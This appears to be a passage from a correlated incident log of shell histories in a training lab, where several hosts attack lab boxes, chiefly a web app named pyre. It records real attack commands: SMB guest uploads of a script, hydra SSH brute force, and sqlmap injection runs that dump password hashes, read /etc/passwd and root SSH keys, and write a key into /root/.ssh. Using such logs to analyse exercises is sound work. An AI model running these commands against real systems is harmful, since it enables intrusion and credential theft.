  - 2026-01-27T19:36:24 | logs/10.100.7.32/shell_history.csv#L691 | mv maintenance.ps1 ../

## Incident 528 - 2026-01-27T19:45:00
- Target IP: 10.100.7.46
- Target Box: ember
- Entries:
  - 2026-01-27T19:45:32 | logs/10.100.7.32/shell_history.csv#L700 | smbclient //10.100.7.46/Scripts --user guest
  - 2026-01-27T19:45:39 | logs/10.100.7.32/shell_history.csv#L701 | smbclient //10.100.7.46/Scripts --user guest -c 'put maintenance.ps1'
  - 2026-01-27T19:45:45 | logs/10.100.7.32/shell_history.csv#L702 | smbclient //10.100.7.46/Scripts --user guest --password '' -c 'put maintenance.ps1'
  - 2026-01-27T19:45:47 | logs/10.100.7.32/shell_history.csv#L703 | smbclient //10.100.7.46/Scripts --user guest --password '' -c 'put maintenance.ps1'
  - 2026-01-27T19:45:47 | logs/10.100.7.32/shell_history.csv#L704 | smbclient //10.100.7.46/Scripts --user guest --password '' -c 'put maintenance.ps1'
- Matched Vulnerability Notes:
  - boxes/ember/documentation.md: phpinfo, anonymous, maintenance.ps1, SMB
  - boxes/ember/deploy/deploy.ps1: git, anonymous, phpinfo, SMB, maintenance.ps1

## Incident 529 - 2026-01-27T19:49:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-27T19:49:29 | logs/10.100.7.32/shell_history.csv#L715 | clear
  - 2026-01-27T19:49:29 | logs/10.100.7.32/shell_history.csv#L716 | ls
  - 2026-01-27T19:49:48 | logs/10.100.7.14/shell_history.csv#L361 | exit

## Incident 530 - 2026-01-27T19:49:00
- Target IP: 10.100.7.40
- Target Box: default
- Entries:
  - 2026-01-27T19:49:30 | logs/10.100.7.22/shell_history.csv#L241 | ssh -i solariskey root@10.100.7.40
  - 2026-01-27T19:49:44 | logs/10.100.7.22/shell_history.csv#L242 | ssh -i solariskey solaris@10.100.7.40

## Incident 531 - 2026-01-27T19:53:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-27T19:53:28 | logs/10.100.7.32/shell_history.csv#L717 | ls
  - 2026-01-27T19:53:29 | logs/10.100.7.32/shell_history.csv#L718 | clear
  - 2026-01-27T19:53:29 | logs/10.100.7.32/shell_history.csv#L719 | ls
  - 2026-01-27T19:53:30 | logs/10.100.7.32/shell_history.csv#L720 | cat maintenance.ps1
  - 2026-01-27T19:53:31 | logs/10.100.7.32/shell_history.csv#L721 | rm maintenance.ps1
  - 2026-01-27T19:53:32 | logs/10.100.7.32/shell_history.csv#L722 | ls

## Incident 532 - 2026-01-27T19:55:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-27T19:55:11 | logs/10.100.7.32/shell_history.csv#L723 | ls
  - 2026-01-27T19:55:17 | logs/10.100.7.32/shell_history.csv#L724 | ls
  - 2026-01-27T19:55:18 | logs/10.100.7.32/shell_history.csv#L725 | ls
  - 2026-01-27T19:55:19 | logs/10.100.7.32/shell_history.csv#L726 | cd Documents
  - 2026-01-27T19:55:52 | logs/10.100.7.32/shell_history.csv#L728 | ls
  - 2026-01-27T19:55:54 | logs/10.100.7.32/shell_history.csv#L729 | cat helios_credentials.txt
  - 2026-01-27T19:55:55 | logs/10.100.7.32/shell_history.csv#L730 | ls
  - 2026-01-27T19:55:54 | logs/10.100.7.14/shell_history.csv#L374 | tldr ffuf
  - 2026-01-27T19:55:37 | logs/10.100.7.12/shell_history.csv#L47 | exit

## Incident 533 - 2026-01-27T19:56:00
- Target IP: 10.100.7.42
- Target Box: orbital
- Entries:
  - 2026-01-27T19:56:02 | logs/10.100.7.13/shell_history.csv#L230 | nxc smb 10.100.7.42
  - 2026-01-27T19:56:41 | logs/10.100.7.13/shell_history.csv#L231 | nxc smb 10.100.7.42 -u guest -p ''
- Matched Vulnerability Notes:
  - boxes/orbital/documentation.md: base64, sql, anonymous, SMB
  - boxes/orbital/deploy/Install-MSSQL.ps1: sql, git
  - boxes/orbital/deploy/deploy.ps1: sql, anonymous, SMB

## Incident 534 - 2026-01-27T20:12:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-01-27T20:12:40 | logs/10.100.7.32/shell_history.csv#L736 | curl http://10.100.7.45/panels.php
  - 2026-01-27T20:12:43 | logs/10.100.7.32/shell_history.csv#L737 | curl http://10.100.7.45/
  - 2026-01-27T20:12:47 | logs/10.100.7.32/shell_history.csv#L738 | curl http://10.100.7.45/admin
  - 2026-01-27T20:12:49 | logs/10.100.7.32/shell_history.csv#L739 | curl http://10.100.7.45/admin.php
  - 2026-01-27T20:12:53 | logs/10.100.7.32/shell_history.csv#L740 | curl http://10.100.7.45/admin.php
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 535 - 2026-01-27T20:12:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-27T20:12:33 | logs/10.100.7.14/shell_history.csv#L388 | dirbuster
  - 2026-01-27T20:12:39 | logs/10.100.7.14/shell_history.csv#L389 | wordlists

## Incident 536 - 2026-01-27T20:31:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-01-27T20:31:48 | logs/10.100.7.32/shell_history.csv#L747 | who -u
  - 2026-01-27T20:31:57 | logs/10.100.7.32/shell_history.csv#L750 | ls
  - 2026-01-27T20:31:58 | logs/10.100.7.32/shell_history.csv#L751 | tmux
  - 2026-01-27T20:31:11 | logs/10.100.7.24/shell_history.csv#L303 | ls
  - 2026-01-27T20:31:36 | logs/10.100.7.24/shell_history.csv#L304 | vim maintenance.ps1

## Incident 537 - 2026-02-02T18:03:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-02T18:03:24 | logs/10.100.7.32/shell_history.csv#L752 | cat ~/.zsh_history
  - 2026-02-02T18:03:47 | logs/10.100.7.12/shell_history.csv#L73 | tldr sqlmap

## Incident 538 - 2026-02-02T18:08:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-02T18:08:30 | logs/10.100.7.32/shell_history.csv#L753 | clear
  - 2026-02-02T18:08:30 | logs/10.100.7.32/shell_history.csv#L754 | ls

## Incident 539 - 2026-02-02T18:34:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-02T18:34:22 | logs/10.100.7.32/shell_history.csv#L755 | cat ~/.zsh_history
  - 2026-02-02T18:34:31 | logs/10.100.7.32/shell_history.csv#L756 | cat ~/.zsh_history
  - 2026-02-02T18:34:32 | logs/10.100.7.32/shell_history.csv#L757 | clear
  - 2026-02-02T18:34:32 | logs/10.100.7.32/shell_history.csv#L758 | ls
  - 2026-02-02T18:34:51 | logs/10.100.7.12/shell_history.csv#L129 | ls
  - 2026-02-02T18:34:53 | logs/10.100.7.12/shell_history.csv#L130 | clear

## Incident 540 - 2026-02-02T18:37:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-02T18:37:05 | logs/10.100.7.32/shell_history.csv#L759 | cat ~/.zsh_history
  - 2026-02-02T18:37:17 | logs/10.100.7.32/shell_history.csv#L761 | clear
  - 2026-02-02T18:37:21 | logs/10.100.7.32/shell_history.csv#L762 | rm ~/.ssh/known_hosts

## Incident 541 - 2026-02-02T18:37:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-02T18:37:02 | logs/10.100.7.14/shell_history.csv#L401 | dirbuster -u http://10.100.7.45 -e directory-list-2.3-medium.txt
  - 2026-02-02T18:37:41 | logs/10.100.7.12/shell_history.csv#L133 | sqlmap -u 10.100.7.45/panels.php?id=1" -D pyrewatch -T alerts --columns"
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 542 - 2026-02-02T18:38:00
- Target IP: 10.100.7.44
- Target Box: forge
- Entries:
  - 2026-02-02T18:38:03 | logs/10.100.7.32/shell_history.csv#L763 | ssh forge@10.100.7.44
  - 2026-02-02T18:38:50 | logs/10.100.7.32/shell_history.csv#L764 | ssh -i ~/.ssh/helios_ssh_key root@10.100.7.44
- Matched Vulnerability Notes:
  - boxes/forge/documentation.md: git, cron
  - boxes/forge/deploy/init-repo.sh: git
  - boxes/forge/deploy/root-cron.sh: git, cron
  - boxes/forge/deploy/deploy.sh: git, cron
  - boxes/forge/deploy/nginx-git.conf: git

## Incident 543 - 2026-02-02T18:44:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-02T18:44:36 | logs/10.100.7.32/shell_history.csv#L765 | cat ~/.zsh_history
  - 2026-02-02T18:44:41 | logs/10.100.7.32/shell_history.csv#L766 | history | grep .44
  - 2026-02-02T18:44:44 | logs/10.100.7.32/shell_history.csv#L767 | history | grep .44
  - 2026-02-02T18:44:30 | logs/10.100.7.13/shell_history.csv#L266 | find / -user pyre
  - 2026-02-02T18:44:40 | logs/10.100.7.13/shell_history.csv#L267 | find / -user forge

## Incident 544 - 2026-02-02T18:48:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-02T18:48:33 | logs/10.100.7.32/shell_history.csv#L771 | curl http://10.100.7.45/panels.php?id=%22test%22
  - 2026-02-02T18:48:38 | logs/10.100.7.32/shell_history.csv#L772 | curl http://10.100.7.45/panels.php?id=test""
  - 2026-02-02T18:48:43 | logs/10.100.7.32/shell_history.csv#L773 | curl http://10.100.7.45/panels.php?id=%22test%22
  - 2026-02-02T18:48:37 | logs/10.100.7.14/shell_history.csv#L404 | nmap -sV -p 1-65535 -T3 10.100.7.45
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 545 - 2026-02-02T19:11:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-02T19:11:13 | logs/10.100.7.32/shell_history.csv#L775 | nmap 10.100.7.45
  - 2026-02-02T19:11:41 | logs/10.100.7.32/shell_history.csv#L776 | ssh pyre@10.100.7.45
  - 2026-02-02T19:11:56 | logs/10.100.7.32/shell_history.csv#L780 | hydra -l pyre -P helios_credentials.txt ssh://10.100.7.45
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 546 - 2026-02-02T19:11:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-02T19:11:41 | logs/10.100.7.32/shell_history.csv#L777 | ls
  - 2026-02-02T19:11:46 | logs/10.100.7.32/shell_history.csv#L778 | cd Documents
  - 2026-02-02T19:11:47 | logs/10.100.7.32/shell_history.csv#L779 | ls

## Incident 547 - 2026-02-02T19:21:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-02T19:21:31 | logs/10.100.7.32/shell_history.csv#L783 | sqlmap
  - 2026-02-02T19:21:36 | logs/10.100.7.32/shell_history.csv#L784 | tldr sqlmap
  - 2026-02-02T19:21:57 | logs/10.100.7.32/shell_history.csv#L785 | tldr sqlmap

## Incident 548 - 2026-02-02T19:21:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-02T19:21:21 | logs/10.100.7.14/shell_history.csv#L407 | nikto -h http://10.100.7.45
  - 2026-02-02T19:21:05 | logs/10.100.7.13/shell_history.csv#L292 | gobuster dir u http://10.100.7.45 -w /usr/share/wordlists/dirb/common.txt
  - 2026-02-02T19:21:37 | logs/10.100.7.12/shell_history.csv#L162 | sqlmap -u 10.100.7.45/panels.php?id=1" --file-read=/etc/passwd"
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 549 - 2026-02-02T19:22:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-02T19:22:58 | logs/10.100.7.32/shell_history.csv#L786 | sqlmap -u http://10.100.7.45/panels.php?id=1""
  - 2026-02-02T19:22:08 | logs/10.100.7.13/shell_history.csv#L293 | gobuster dir -u http://10.100.7.45 -w /usr/share/wordlists/dirb/common.txt
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 550 - 2026-02-02T19:23:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-02T19:23:06 | logs/10.100.7.32/shell_history.csv#L787 | sqlmap -u http://10.100.7.45/panels.php?id=1""
  - 2026-02-02T19:23:11 | logs/10.100.7.32/shell_history.csv#L788 | cd ~/.local/share/sqlmap/output/10.100.7.45
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 551 - 2026-02-02T19:23:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-02T19:23:12 | logs/10.100.7.32/shell_history.csv#L789 | ls
  - 2026-02-02T19:23:15 | logs/10.100.7.32/shell_history.csv#L790 | ls
  - 2026-02-02T19:23:18 | logs/10.100.7.32/shell_history.csv#L791 | cat target.txt
  - 2026-02-02T19:23:19 | logs/10.100.7.32/shell_history.csv#L792 | ls
  - 2026-02-02T19:23:21 | logs/10.100.7.32/shell_history.csv#L793 | cat log
  - 2026-02-02T19:23:26 | logs/10.100.7.32/shell_history.csv#L794 | cat log
  - 2026-02-02T19:23:28 | logs/10.100.7.32/shell_history.csv#L795 | cat session.sqlite
  - 2026-02-02T19:23:30 | logs/10.100.7.32/shell_history.csv#L796 | clear

## Incident 552 - 2026-02-02T19:26:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-02T19:26:31 | logs/10.100.7.32/shell_history.csv#L798 | sqlite3 session.sqlite
  - 2026-02-02T19:26:37 | logs/10.100.7.32/shell_history.csv#L799 | sqlite3 session.sqlite tables
  - 2026-02-02T19:26:41 | logs/10.100.7.32/shell_history.csv#L800 | sqlite3 session.sqlite .tables

## Incident 553 - 2026-02-02T19:28:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-02T19:28:34 | logs/10.100.7.32/shell_history.csv#L801 | sqlite3 session.sqlite
  - 2026-02-02T19:28:35 | logs/10.100.7.32/shell_history.csv#L802 | ls
  - 2026-02-02T19:28:36 | logs/10.100.7.32/shell_history.csv#L803 | cd ../..
  - 2026-02-02T19:28:37 | logs/10.100.7.32/shell_history.csv#L804 | ls

## Incident 554 - 2026-02-02T19:28:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-02T19:28:40 | logs/10.100.7.32/shell_history.csv#L805 | sqlmap -u http://10.100.7.45/panels.php?id=1""
  - 2026-02-02T19:28:21 | logs/10.100.7.14/shell_history.csv#L408 | sqlmap -u http://10.100.7.45" --dbs"
  - 2026-02-02T19:28:45 | logs/10.100.7.13/shell_history.csv#L296 | curl http://10.100.7.45/index.php?id=1'""
  - 2026-02-02T19:28:39 | logs/10.100.7.12/shell_history.csv#L166 | sqlmap -u 10.100.7.45/panels?id=1" --file-read=/etc/passwd"
  - 2026-02-02T19:28:47 | logs/10.100.7.12/shell_history.csv#L167 | sqlmap -u 10.100.7.45/panels.php?id=1" --file-read=/etc/passwd"
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 555 - 2026-02-02T19:31:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-02T19:31:06 | logs/10.100.7.32/shell_history.csv#L806 | sqlmap -u http://10.100.7.45/panels.php?id=1""
  - 2026-02-02T19:31:21 | logs/10.100.7.32/shell_history.csv#L807 | sqlmap -u http://10.100.7.45/panels.php?id=1" --dbs"
  - 2026-02-02T19:31:28 | logs/10.100.7.32/shell_history.csv#L808 | sqlmap -u http://10.100.7.45/panels.php?id=1" --dbs"
  - 2026-02-02T19:31:36 | logs/10.100.7.32/shell_history.csv#L809 | cd ~/.local/share/sqlmap/output/10.100.7.45
  - 2026-02-02T19:31:20 | logs/10.100.7.14/shell_history.csv#L413 | sqlmap -u http://10.100.7.45/index.php?id=1" --dbs --crawl=2 --risk=3"
  - 2026-02-02T19:31:03 | logs/10.100.7.13/shell_history.csv#L297 | curl http://10.100.7.45/index.php?id=5""
  - 2026-02-02T19:31:37 | logs/10.100.7.12/shell_history.csv#L170 | sqlmap -u 10.100.7.45/panels.php?id=1" --file-read=/root/.ssh/id_rsa --hex"
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 556 - 2026-02-02T19:31:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-02T19:31:36 | logs/10.100.7.32/shell_history.csv#L810 | ls
  - 2026-02-02T19:31:40 | logs/10.100.7.32/shell_history.csv#L811 | cat log
  - 2026-02-02T19:31:41 | logs/10.100.7.32/shell_history.csv#L812 | ls
  - 2026-02-02T19:31:44 | logs/10.100.7.32/shell_history.csv#L813 | cat target.txt

## Incident 557 - 2026-02-02T19:33:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-02T19:33:33 | logs/10.100.7.32/shell_history.csv#L814 | cat target.txt
  - 2026-02-02T19:33:20 | logs/10.100.7.14/shell_history.csv#L416 | searchsploit joomla
  - 2026-02-02T19:33:49 | logs/10.100.7.14/shell_history.csv#L417 | searchsploit apache2.4.52

## Incident 558 - 2026-02-02T19:33:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-02T19:33:05 | logs/10.100.7.13/shell_history.csv#L298 | curl http://10.100.7.45/panels.php?id=5""
  - 2026-02-02T19:33:00 | logs/10.100.7.12/shell_history.csv#L172 | sqlmap -u 10.100.7.45/panels.php?id=1" --file-read=/etc/ssh"
  - 2026-02-02T19:33:06 | logs/10.100.7.12/shell_history.csv#L173 | sqlmap -u 10.100.7.45/panels.php?id=1" --file-read=/etc/ssh/"
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 559 - 2026-02-02T19:34:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-02T19:34:17 | logs/10.100.7.32/shell_history.csv#L815 | sqlmap -u http://10.100.7.45/panels.php?id=1" -D "pyrewatch" --tables"
  - 2026-02-02T19:34:57 | logs/10.100.7.13/shell_history.csv#L299 | curl http://10.100.7.45/panels.php?id=abc""
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 560 - 2026-02-02T19:36:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-02T19:36:34 | logs/10.100.7.32/shell_history.csv#L817 | sqlmap -u http://10.100.7.45/panels.php?id=1" -D "information_schema" -T "FILES" --dump"
  - 2026-02-02T19:36:36 | logs/10.100.7.32/shell_history.csv#L818 | sqlmap -u http://10.100.7.45/panels.php?id=1" -D "information_schema" -T "FILES" --dump --threads"
  - 2026-02-02T19:36:42 | logs/10.100.7.32/shell_history.csv#L819 | sqlmap -u http://10.100.7.45/panels.php?id=1" -D "information_schema" -T "FILES" --dump --threads $(nrpoc)"
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 561 - 2026-02-02T19:37:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-02T19:37:32 | logs/10.100.7.32/shell_history.csv#L820 | sqlmap -u http://10.100.7.45/panels.php?id=1" -D "information_schema" -T "FILES" --dump --threads $(nproc)"
  - 2026-02-02T19:37:35 | logs/10.100.7.32/shell_history.csv#L821 | sqlmap -u http://10.100.7.45/panels.php?id=1" -D "information_schema" -T "FILES" --dump --threads $(nproc)"
  - 2026-02-02T19:37:44 | logs/10.100.7.32/shell_history.csv#L824 | sqlmap -u http://10.100.7.45/panels.php?id=1" --dbs"
  - 2026-02-02T19:37:17 | logs/10.100.7.13/shell_history.csv#L301 | curl http://10.100.7.45/panels.php?id=5 AND 1=1""
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 562 - 2026-02-02T19:37:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-02T19:37:38 | logs/10.100.7.32/shell_history.csv#L822 | history | grep sqlmap
  - 2026-02-02T19:37:41 | logs/10.100.7.32/shell_history.csv#L823 | history | grep sqlmap

## Incident 563 - 2026-02-02T19:38:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-02T19:38:27 | logs/10.100.7.32/shell_history.csv#L825 | history | grep sqlmap
  - 2026-02-02T19:38:41 | logs/10.100.7.32/shell_history.csv#L826 | history | grep sqlmap

## Incident 564 - 2026-02-02T19:38:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-02T19:38:43 | logs/10.100.7.32/shell_history.csv#L827 | sqlmap -u http://10.100.7.45/panels.php?id=1" -D "pyrewatch" --tables"
  - 2026-02-02T19:38:52 | logs/10.100.7.32/shell_history.csv#L828 | sqlmap -u http://10.100.7.45/panels.php?id=1" -D "pyrewatch" --tables --threads $(nproc)"
  - 2026-02-02T19:38:25 | logs/10.100.7.13/shell_history.csv#L302 | curl http://10.100.7.45/panels.php?id=5%20AND%201=1""
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 565 - 2026-02-02T19:39:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-02T19:39:07 | logs/10.100.7.32/shell_history.csv#L829 | sqlmap -u http://10.100.7.45/panels.php?id=1" -D "pyrewatch" -T "alerts" --threads $(nproc)"
  - 2026-02-02T19:39:53 | logs/10.100.7.12/shell_history.csv#L174 | sqlmap -u 10.100.7.45/panels.php?id=1" --file-read=/etc/ssh/sshd_config --threads 10"
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 566 - 2026-02-02T19:39:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-02T19:39:11 | logs/10.100.7.32/shell_history.csv#L830 | ls
  - 2026-02-02T19:39:13 | logs/10.100.7.32/shell_history.csv#L831 | ls
  - 2026-02-02T19:39:14 | logs/10.100.7.32/shell_history.csv#L832 | ls dump
  - 2026-02-02T19:39:15 | logs/10.100.7.32/shell_history.csv#L833 | ls
  - 2026-02-02T19:39:16 | logs/10.100.7.32/shell_history.csv#L834 | rm -rf dump

## Incident 567 - 2026-02-02T19:41:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-02T19:41:32 | logs/10.100.7.32/shell_history.csv#L835 | sqlmap -u http://10.100.7.45/panels.php?id=1" -D "pyrewatch" -T "alerts" --dump --threads $(nproc)"
  - 2026-02-02T19:41:42 | logs/10.100.7.32/shell_history.csv#L836 | sqlmap -u http://10.100.7.45/panels.php?id=1" -D "pyrewatch" -T "alerts" --dump --threads $(nproc)"
  - 2026-02-02T19:41:46 | logs/10.100.7.32/shell_history.csv#L837 | sqlmap -u http://10.100.7.45/panels.php?id=1" -D "pyrewatch" -T "alerts" --threads $(nproc)"
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 568 - 2026-02-02T19:43:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-02T19:43:16 | logs/10.100.7.32/shell_history.csv#L849 | ls
  - 2026-02-02T19:43:20 | logs/10.100.7.12/shell_history.csv#L175 | ls
  - 2026-02-02T19:43:23 | logs/10.100.7.12/shell_history.csv#L176 | cd Documents
  - 2026-02-02T19:43:25 | logs/10.100.7.12/shell_history.csv#L177 | ls
  - 2026-02-02T19:43:30 | logs/10.100.7.12/shell_history.csv#L178 | cd ~

## Incident 569 - 2026-02-02T19:48:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-02T19:48:36 | logs/10.100.7.32/shell_history.csv#L851 | sqlmap -u http://10.100.7.45/panels.php?id=1""
  - 2026-02-02T19:48:13 | logs/10.100.7.13/shell_history.csv#L319 | curl http://10.100.7.45/panels.php?id=5%20ORDER%20BY%204--%20-""
  - 2026-02-02T19:48:28 | logs/10.100.7.13/shell_history.csv#L320 | curl http://10.100.7.45/panels.php?id=5%20ORDER%20BY%208--%20-""
  - 2026-02-02T19:48:41 | logs/10.100.7.13/shell_history.csv#L321 | curl http://10.100.7.45/panels.php?id=5%20ORDER%20BY%2010--%20-""
  - 2026-02-02T19:48:51 | logs/10.100.7.13/shell_history.csv#L322 | curl http://10.100.7.45/panels.php?id=5%20ORDER%20BY%2030--%20-""
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 570 - 2026-02-02T19:48:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-02T19:48:39 | logs/10.100.7.32/shell_history.csv#L852 | ls
  - 2026-02-02T19:48:40 | logs/10.100.7.32/shell_history.csv#L853 | ls
  - 2026-02-02T19:48:42 | logs/10.100.7.32/shell_history.csv#L854 | cd ../..
  - 2026-02-02T19:48:42 | logs/10.100.7.32/shell_history.csv#L855 | ls
  - 2026-02-02T19:48:43 | logs/10.100.7.32/shell_history.csv#L856 | ls
  - 2026-02-02T19:48:45 | logs/10.100.7.32/shell_history.csv#L857 | cat log
  - 2026-02-02T19:48:32 | logs/10.100.7.12/shell_history.csv#L183 | cat Documents/rsa_id
  - 2026-02-02T19:48:35 | logs/10.100.7.12/shell_history.csv#L184 | ls
  - 2026-02-02T19:48:36 | logs/10.100.7.12/shell_history.csv#L185 | cd Documents
  - 2026-02-02T19:48:44 | logs/10.100.7.12/shell_history.csv#L186 | ls
  - 2026-02-02T19:48:51 | logs/10.100.7.12/shell_history.csv#L187 | cd ~
  - 2026-02-02T19:48:57 | logs/10.100.7.12/shell_history.csv#L188 | cat Documents/rsa_id

## Incident 571 - 2026-02-02T19:50:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-02T19:50:33 | logs/10.100.7.32/shell_history.csv#L858 | sqlmap -u http://10.100.7.45/alerts.php?severity=&status=""
  - 2026-02-02T19:50:44 | logs/10.100.7.32/shell_history.csv#L859 | sqlmap -u http://10.100.7.45/alerts.php?severity=&status=""
  - 2026-02-02T19:50:33 | logs/10.100.7.12/shell_history.csv#L200 | sqlmap -u 10.100.7.45/panels.php?id=1" --file-write=./id_rsa --file-dest=/root/.ssh/id_rsa"
  - 2026-02-02T19:50:43 | logs/10.100.7.12/shell_history.csv#L201 | sqlmap -u 10.100.7.45/panels.php?id=1" --file-write=./rsa_id --file-dest=/root/.ssh/rsa_id"
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 572 - 2026-02-02T19:50:00
- Target IP: None
- Target Box: None
- Entries:
  - 2026-02-02T19:50:45 | logs/10.100.7.32/shell_history.csv#L860 | ls
  - 2026-02-02T19:50:47 | logs/10.100.7.32/shell_history.csv#L861 | cat log
  - 2026-02-02T19:50:02 | logs/10.100.7.12/shell_history.csv#L199 | cd Documents

## Incident 573 - 2026-02-02T19:52:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-02T19:52:48 | logs/10.100.7.32/shell_history.csv#L862 | sqlmap -u http://10.100.7.45/panels.php?id=1" --batch -D"
  - 2026-02-02T19:52:52 | logs/10.100.7.32/shell_history.csv#L863 | sqlmap -u http://10.100.7.45/panels.php?id=1" --batch"
  - 2026-02-02T19:52:59 | logs/10.100.7.32/shell_history.csv#L864 | sqlmap -u http://10.100.7.45/panels.php?id=" --batch"
  - 2026-02-02T19:52:02 | logs/10.100.7.13/shell_history.csv#L327 | curl http://10.100.7.45/panels.php?id=5%20AND%201=2""
  - 2026-02-02T19:52:27 | logs/10.100.7.12/shell_history.csv#L206 | sqlmap -u 10.100.7.45/panels.php?id=1" --file-read=/root/.ssh/"
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 574 - 2026-02-02T19:53:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-02T19:53:05 | logs/10.100.7.32/shell_history.csv#L865 | sqlmap -u http://10.100.7.45/panels.php?id=1" --batch"
  - 2026-02-02T19:53:38 | logs/10.100.7.32/shell_history.csv#L866 | sqlmap -u http://10.100.7.45/panels.php?id=1" --uesrs"
  - 2026-02-02T19:53:38 | logs/10.100.7.32/shell_history.csv#L867 | sqlmap -u http://10.100.7.45/panels.php?id=1" --uesrs"
  - 2026-02-02T19:53:43 | logs/10.100.7.32/shell_history.csv#L868 | sqlmap -u http://10.100.7.45/panels.php?id=1" --users"
  - 2026-02-02T19:53:57 | logs/10.100.7.32/shell_history.csv#L869 | sqlmap -u http://10.100.7.45/panels.php?id=1" --passwords"
- Matched Vulnerability Notes:
  - boxes/pyre/documentation.md: sql, git, sql injection
  - boxes/pyre/deploy/deploy.sh: sql, sql injection, cron

## Incident 575 - 2026-02-02T19:54:00
- Target IP: 10.100.7.45
- Target Box: pyre
- Entries:
  - 2026-02-02T19:54:22 | logs/10.100.7.32/shell_history.csv#L870 | sqlmap -u http://10.100.7.45/panels.php?id=1" --users --passwords"
